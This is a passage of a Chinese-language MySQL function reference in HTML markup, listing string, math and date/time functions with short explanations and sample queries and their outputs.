LCASE(’QUADRATICALLY’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘quadratically’</span></span><br><span class="line"></span><br><span class="line">UCASE(str)</span><br><span class="line">UPPER(str)</span><br><span class="line">返回大写的字符串str</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select UCASE(’quadratically’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘QUADRATICALLY’</span></span><br><span class="line"></span><br><span class="line">LOAD_FILE(file_name)</span><br><span class="line">读入文件并且作为一个字符串返回文件内容(文件无法找到,路径不完整,没有权限,长度大于max_allowed_packet会返回NULL)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> UPDATE table_name SET blob_column=LOAD_FILE(”/tmp/picture”) WHERE id=1;</span></span><br><span class="line"></span><br><span class="line">数学函数</span><br><span class="line"></span><br><span class="line">ABS(N)</span><br><span class="line">返回N的绝对值</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ABS(2);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 2</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ABS(-32);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 32</span></span><br><span class="line"></span><br><span class="line">SIGN(N)</span><br><span class="line">返回参数的符号(为-1、0或1)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select SIGN(-32);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> -1</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select SIGN(0);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 0</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select SIGN(234);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 1</span></span><br><span class="line"></span><br><span class="line">MOD(N,M)</span><br><span class="line">取模运算,返回N被M除的余数(同%操作符) </span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select MOD(234, 10);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 4</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select 234 % 10;</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 4</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select MOD(29,9);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 2</span></span><br><span class="line"></span><br><span class="line">FLOOR(N)</span><br><span class="line">返回不大于N的最大整数值</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select FLOOR(1.23);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 1</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select FLOOR(-1.23);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> -2</span></span><br><span class="line"></span><br><span class="line">CEILING(N)</span><br><span class="line">返回不小于N的最小整数值</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select CEILING(1.23);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 2</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select CEILING(-1.23);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> -1</span></span><br><span class="line"></span><br><span class="line">ROUND(N,D)</span><br><span class="line">返回N的四舍五入值,保留D位小数(D的默认值为0)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ROUND(-1.23);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> -1</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ROUND(-1.58);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> -2</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ROUND(1.58);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 2</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ROUND(1.298, 1);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 1.3</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ROUND(1.298, 0);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 1</span></span><br><span class="line"></span><br><span class="line">EXP(N)</span><br><span class="line">返回值e的N次方(自然对数的底)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select EXP(2);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 7.389056</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select EXP(-2);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 0.135335</span></span><br><span class="line"></span><br><span class="line">LOG(N)</span><br><span class="line">返回N的自然对数</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select LOG(2);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 0.693147</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select LOG(-2);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> NULL</span></span><br><span class="line"></span><br><span class="line">LOG10(N)</span><br><span class="line">返回N以10为底的对数</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select LOG10(2);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 0.301030</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select LOG10(100);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 2.000000</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select LOG10(-100);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> NULL</span></span><br><span class="line"></span><br><span class="line">POW(X,Y)</span><br><span class="line">POWER(X,Y)</span><br><span class="line">返回值X的Y次幂</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select POW(2,2);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 4.000000</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select POW(2,-2);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 0.250000</span></span><br><span class="line"></span><br><span class="line">SQRT(N)</span><br><span class="line">返回非负数N的平方根</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select SQRT(4);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 2.000000</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select SQRT(20);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 4.472136</span></span><br><span class="line"></span><br><span class="line">PI()</span><br><span class="line">返回圆周率</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select PI();</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 3.141593</span></span><br><span class="line"></span><br><span class="line">COS(N)</span><br><span class="line">返回N的余弦值</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select COS(PI());</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> -1.000000</span></span><br><span class="line"></span><br><span class="line">SIN(N)</span><br><span class="line">返回N的正弦值</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select SIN(PI());</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 0.000000</span></span><br><span class="line"></span><br><span class="line">TAN(N)</span><br><span class="line">返回N的正切值</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select TAN(PI()+1);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 1.557408</span></span><br><span class="line"></span><br><span class="line">ACOS(N)</span><br><span class="line">返回N反余弦(N是余弦值,在-1到1的范围,否则返回NULL)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ACOS(1);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 0.000000</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ACOS(1.0001);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> NULL</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ACOS(0);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 1.570796</span></span><br><span class="line"></span><br><span class="line">ASIN(N)</span><br><span class="line">返回N反正弦值</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ASIN(0.2);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 0.201358</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ASIN(’foo’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 0.000000</span></span><br><span class="line"></span><br><span class="line">ATAN(N)</span><br><span class="line">返回N的反正切值</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ATAN(2);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 1.107149</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ATAN(-2);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> -1.107149</span></span><br><span class="line">ATAN2(X,Y)</span><br><span class="line">返回2个变量X和Y的反正切(类似Y/X的反正切,符号决定象限)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ATAN(-2,2);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> -0.785398</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select ATAN(PI(),0);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 1.570796</span></span><br><span class="line"></span><br><span class="line">COT(N)</span><br><span class="line">返回X的余切</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select COT(12);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> -1.57267341</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select COT(0);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> NULL</span></span><br><span class="line"></span><br><span class="line">RAND()</span><br><span class="line">RAND(N)</span><br><span class="line">返回在范围0到1.0内的随机浮点值(可以使用数字N作为初始值)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select RAND();</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 0.5925</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select RAND(20);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 0.1811</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select RAND(20);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 0.1811</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select RAND();</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 0.2079</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select RAND();</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 0.7888</span></span><br><span class="line"></span><br><span class="line">DEGREES(N)</span><br><span class="line">把N从弧度变换为角度并返回</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select DEGREES(PI());</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 180.000000</span></span><br><span class="line"></span><br><span class="line">RADIANS(N)</span><br><span class="line">把N从角度变换为弧度并返回 </span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select RADIANS(90);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 1.570796</span></span><br><span class="line"></span><br><span class="line">TRUNCATE(N,D)</span><br><span class="line">保留数字N的D位小数并返回</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select TRUNCATE(1.223,1);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 1.2</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select TRUNCATE(1.999,1);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 1.9</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select TRUNCATE(1.999,0);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 1</span></span><br><span class="line"></span><br><span class="line">LEAST(X,Y,…)</span><br><span class="line">返回最小值(如果返回值被用在整数(实数或大小敏感字串)上下文或所有参数都是整数(实数或大小敏感字串)则他们作为整数(实数或大小敏感字串)比较,否则按忽略大小写的字符串被比较)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select LEAST(2,0);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 0</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select LEAST(34.0,3.0,5.0,767.0);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 3.0</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select LEAST(”B”,”A”,”C”);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> “A”</span></span><br><span class="line"></span><br><span class="line">GREATEST(X,Y,…)</span><br><span class="line">返回最大值(其余同LEAST())</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select GREATEST(2,0);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 2</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select GREATEST(34.0,3.0,5.0,767.0);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 767.0</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select GREATEST(”B”,”A”,”C”);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> “C”</span></span><br><span class="line"></span><br><span class="line">时期时间函数</span><br><span class="line"></span><br><span class="line">DAYOFWEEK(date)</span><br><span class="line">返回日期date是星期几(1=星期天,2=星期一,……7=星期六,ODBC标准)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select DAYOFWEEK(’1998-02-03′);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 3</span></span><br><span class="line"></span><br><span class="line">WEEKDAY(date)</span><br><span class="line">返回日期date是星期几(0=星期一,1=星期二,……6= 星期天)。 </span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select WEEKDAY(’1997-10-04 22:23:00′);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 5</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select WEEKDAY(’1997-11-05′);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 2</span></span><br><span class="line"></span><br><span class="line">DAYOFMONTH(date)</span><br><span class="line">返回date是一月中的第几日(在1到31范围内) </span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select DAYOFMONTH(’1998-02-03′);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 3</span></span><br><span class="line"></span><br><span class="line">DAYOFYEAR(date)</span><br><span class="line">返回date是一年中的第几日(在1到366范围内) </span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select DAYOFYEAR(’1998-02-03′);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 34</span></span><br><span class="line"></span><br><span class="line">MONTH(date)</span><br><span class="line">返回date中的月份数值 </span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select MONTH(’1998-02-03′);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 2</span></span><br><span class="line"></span><br><span class="line">DAYNAME(date)</span><br><span class="line">返回date是星期几(按英文名返回)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select DAYNAME(”1998-02-05″);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘Thursday’</span></span><br><span class="line"></span><br><span class="line">MONTHNAME(date)</span><br><span class="line">返回date是几月(按英文名返回)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select MONTHNAME(”1998-02-05″);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘February’</span></span><br><span class="line"></span><br><span class="line">QUARTER(date)</span><br><span class="line">返回date是一年的第几个季度</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select QUARTER(’98-04-01′);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 2</span></span><br><span class="line"></span><br><span class="line">WEEK(date,first)</span><br><span class="line">返回date是一年的第几周(first默认值0,first取值1表示周一是周的开始,0从周日开始)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select WEEK(’1998-02-20′);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 7</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select WEEK(’1998-02-20′,0);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 7</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select WEEK(’1998-02-20′,1);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 8</span></span><br><span class="line"></span><br><span class="line">YEAR(date)</span><br><span class="line">返回date的年份(范围在1000到9999) </span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select YEAR(’98-02-03′);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 1998</span></span><br><span class="line"></span><br><span class="line">HOUR(time)</span><br><span class="line">返回time的小时数(范围是0到23) </span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select HOUR(’10:05:03′);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 10</span></span><br><span class="line"></span><br><span class="line">MINUTE(time)</span><br><span class="line">返回time的分钟数(范围是0到59) </span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select MINUTE(’98-02-03 10:05:03′);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 5</span></span><br><span class="line"></span><br><span class="line">SECOND(time)</span><br><span class="line">返回time的秒数(范围是0到59) </span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select SECOND(’10:05:03′);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 3</span></span><br><span class="line"></span><br><span class="line">PERIOD_ADD(P,N)</span><br><span class="line">增加N个月到时期P并返回(P的格式YYMM或YYYYMM) </span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select PERIOD_ADD(9801,2);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 199803</span></span><br><span class="line"></span><br><span class="line">PERIOD_DIFF(P1,P2)</span><br><span class="line">返回在时期P1和P2之间月数(P1和P2的格式YYMM或YYYYMM)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select PERIOD_DIFF(9802,199703);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 11</span></span><br><span class="line"></span><br><span class="line">DATE_ADD(date,INTERVAL expr type)</span><br><span class="line">DATE_SUB(date,INTERVAL expr type)</span><br><span class="line">ADDDATE(date,INTERVAL expr type)</span><br><span class="line">SUBDATE(date,INTERVAL expr type)</span><br><span class="line">对日期时间进行加减法运算</span><br><span class="line">(ADDDATE()和SUBDATE()是DATE_ADD()和DATE_SUB()的同义词,也可以用运算符+和-而不是函数</span><br><span class="line">date是一个DATETIME或DATE值,expr对date进行加减法的一个表达式字符串type指明表达式expr应该如何被解释</span><br><span class="line">[type值 含义 期望的expr格式]:</span><br><span class="line">SECOND 秒 SECONDS</span><br><span class="line">MINUTE 分钟 MINUTES</span><br><span class="line">HOUR 时间 HOURS</span><br><span class="line">DAY 天 DAYS</span><br><span class="line">MONTH 月 MONTHS</span><br><span class="line">YEAR 年 YEARS</span><br><span class="line">MINUTE_SECOND 分钟和秒 “MINUTES:SECONDS”</span><br><span class="line">HOUR_MINUTE 小时和分钟 “HOURS:MINUTES”</span><br><span class="line">DAY_HOUR 天和小时 “DAYS HOURS”</span><br><span class="line">YEAR_MONTH 年和月 “YEARS-MONTHS”</span><br><span class="line">HOUR_SECOND 小时, 分钟， “HOURS:MINUTES:SECONDS”</span><br><span class="line">DAY_MINUTE 天, 小时, 分钟 “DAYS HOURS:MINUTES”</span><br><span class="line">DAY_SECOND 天, 小时, 分钟, 秒 “DAYS HOURS:MINUTES:SECONDS”</span><br><span class="line">expr中允许任何标点做分隔符,如果所有是DATE值时结果是一个DATE值,否则结果是一个DATETIME值)</span><br><span class="line">如果type关键词不完整,则MySQL从右端取值,DAY_SECOND因为缺少小时分钟等于MINUTE_SECOND)</span><br><span class="line">如果增加MONTH、YEAR_MONTH或YEAR,天数大于结果月份的最大天数则使用最大天数)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT “1997-12-31 23:59:59″ + INTERVAL 1 SECOND;</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 1998-01-01 00:00:00</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT INTERVAL 1 DAY + “1997-12-31″;</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 1998-01-01</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT “1998-01-01″ – INTERVAL 1 SECOND;</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 1997-12-31 23:59:59</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT DATE_ADD(”1997-12-31 23:59:59″,INTERVAL 1 SECOND);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 1998-01-01 00:00:00</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT DATE_ADD(”1997-12-31 23:59:59″,INTERVAL 1 DAY);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 1998-01-01 23:59:59</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT DATE_ADD(”1997-12-31 23:59:59″,INTERVAL “1:1″ MINUTE_SECOND);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 1998-01-01 00:01:00</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT DATE_SUB(”1998-01-01 00:00:00″,INTERVAL “1 1:1:1″ DAY_SECOND);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 1997-12-30 22:58:59</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT DATE_ADD(”1998-01-01 00:00:00″, INTERVAL “-1 10″ DAY_HOUR);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 1997-12-30 14:00:00</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT DATE_SUB(”1998-01-02″, INTERVAL 31 DAY);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 1997-12-02</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT EXTRACT(YEAR FROM “1999-07-02″);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 1999</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT EXTRACT(YEAR_MONTH FROM “1999-07-02 01:02:03″);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 199907</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> SELECT EXTRACT(DAY_MINUTE FROM “1999-07-02 01:02:03″);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 20102</span></span><br><span class="line"></span><br><span class="line">TO_DAYS(date)</span><br><span class="line">返回日期date是西元0年至今多少天(不计算1582年以前)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select TO_DAYS(950501);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 728779</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select TO_DAYS(’1997-10-07′);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 729669</span></span><br><span class="line"></span><br><span class="line">FROM_DAYS(N)</span><br><span class="line">给出西元0年至今多少天返回DATE值(不计算1582年以前) </span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select FROM_DAYS(729669);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘1997-10-07′</span></span><br><span class="line"></span><br><span class="line">DATE_FORMAT(date,format)</span><br><span class="line">根据format字符串格式化date值</span><br><span class="line">(在format字符串中可用标志符:</span><br><span class="line"><span class="meta">%</span><span class="bash">M 月名字(January……December)</span></span><br><span class="line"><span class="meta">%</span><span class="bash">W 星期名字(Sunday……Saturday)</span></span><br><span class="line"><span class="meta">%</span><span class="bash">D 有英语前缀的月份的日期(1st, 2nd, 3rd, 等等。）</span></span><br><span class="line"><span class="meta">%</span><span class="bash">Y 年, 数字, 4 位</span></span><br><span class="line"><span class="meta">%</span><span class="bash">y 年, 数字, 2 位</span></span><br><span class="line"><span class="meta">%</span><span class="bash">a 缩写的星期名字(Sun……Sat)</span></span><br><span class="line"><span class="meta">%</span><span class="bash">d 月份中的天数, 数字(00……31)</span></span><br><span class="line"><span class="meta">%</span><span class="bash">e 月份中的天数, 数字(0……31)</span></span><br><span class="line"><span class="meta">%</span><span class="bash">m 月, 数字(01……12)</span></span><br><span class="line"><span class="meta">%</span><span class="bash">c 月, 数字(1……12)</span></span><br><span class="line"><span class="meta">%</span><span class="bash">b 缩写的月份名字(Jan……Dec)</span></span><br><span class="line"><span class="meta">%</span><span class="bash">j 一年中的天数(001……366)</span></span><br><span class="line"><span class="meta">%</span><span class="bash">H 小时(00……23)</span></span><br><span class="line"><span class="meta">%</span><span class="bash">k 小时(0……23)</span></span><br><span class="line"><span class="meta">%</span><span class="bash">h 小时(01……12)</span></span><br><span class="line"><span class="meta">%</span><span class="bash">I 小时(01……12)</span></span><br><span class="line"><span class="meta">%</span><span class="bash">l 小时(1……12)</span></span><br><span class="line"><span class="meta">%</span><span class="bash">i 分钟, 数字(00……59)</span></span><br><span class="line"><span class="meta">%</span><span class="bash">r 时间,12 小时(hh:mm:ss [AP]M)</span></span><br><span class="line"><span class="meta">%</span><span class="bash">T 时间,24 小时(hh:mm:ss)</span></span><br><span class="line"><span class="meta">%</span><span class="bash">S 秒(00……59)</span></span><br><span class="line"><span class="meta">%</span><span class="bash">s 秒(00……59)</span></span><br><span class="line"><span class="meta">%</span><span class="bash">p AM或PM</span></span><br><span class="line"><span class="meta">%</span><span class="bash">w 一个星期中的天数(0=Sunday ……6=Saturday ）</span></span><br><span class="line"><span class="meta">%</span><span class="bash">U 星期(0……52), 这里星期天是星期的第一天</span></span><br><span class="line"><span class="meta">%</span><span class="bash">u 星期(0……52), 这里星期一是星期的第一天</span></span><br><span class="line"><span class="meta">%</span><span class="bash">% 字符% )</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select DATE_FORMAT(’1997-10-04 22:23:00′,’%W %M %Y’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘Saturday October 1997′</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select DATE_FORMAT(’1997-10-04 22:23:00′,’%H:%i:%s’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘22:23:00′</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select DATE_FORMAT(’1997-10-04 22:23:00′,’%D %y %a %d %m %b %j’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘4th 97 Sat 04 10 Oct 277′</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select DATE_FORMAT(’1997-10-04 22:23:00′,’%H %k %I %r %T %S %w’);</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘22 22 10 10:23:00 PM 22:23:00 00 6′</span></span><br><span class="line"></span><br><span class="line">TIME_FORMAT(time,format)</span><br><span class="line">和DATE_FORMAT()类似,但TIME_FORMAT只处理小时、分钟和秒(其余符号产生一个NULL值或0)</span><br><span class="line"></span><br><span class="line">CURDATE()</span><br><span class="line">CURRENT_DATE()</span><br><span class="line">以’YYYY-MM-DD’或YYYYMMDD格式返回当前日期值(根据返回值所处上下文是字符串或数字)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select CURDATE();</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘1997-12-15′</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select CURDATE() + 0;</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 19971215</span></span><br><span class="line"></span><br><span class="line">CURTIME()</span><br><span class="line">CURRENT_TIME()</span><br><span class="line">以’HH:MM:SS’或HHMMSS格式返回当前时间值(根据返回值所处上下文是字符串或数字) </span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select CURTIME();</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘23:50:26′</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select CURTIME() + 0;</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 235026</span></span><br><span class="line"></span><br><span class="line">NOW()</span><br><span class="line">SYSDATE()</span><br><span class="line">CURRENT_TIMESTAMP()</span><br><span class="line">以’YYYY-MM-DD HH:MM:SS’或YYYYMMDDHHMMSS格式返回当前日期时间(根据返回值所处上下文是字符串或数字)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select NOW();</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> ‘1997-12-15 23:50:26′</span></span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select NOW() + 0;</span></span><br><span class="line"><span class="meta">-&gt;</span><span class="bash"> 19971215235026</span></span><br><span class="line"></span><br><span class="line">UNIX_TIMESTAMP()</span><br><span class="line">UNIX_TIMESTAMP(date)</span><br><span class="line">返回一个Unix时间戳(从’1970-01-01 00:00:00′GMT开始的秒数,date默认值为当前时间)</span><br><span class="line"><span class="meta">mysql&gt;</span><span class="bash"> select UNIX_TIMESTAMP();</span></span><br><span class="line"><span 